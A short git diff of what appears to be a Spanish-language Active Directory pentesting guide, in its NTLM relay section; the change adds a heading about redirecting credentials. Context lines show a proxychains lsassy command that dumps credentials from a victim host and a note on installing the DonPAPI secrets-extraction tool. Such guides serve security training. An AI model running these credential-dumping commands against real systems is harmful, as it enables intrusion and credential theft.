@@ -31,6 +31,7 @@ proxychains lsassy --no-pass -d <dominio> -u <usuario> <ip víctima>
 
 ![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid4.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 1")
 
+# Redirigir las credenciales
 
 ```Bash
 # Instalar DonPAPI con desde su github con poetry: https://github.com/login-securite/DonPAPI
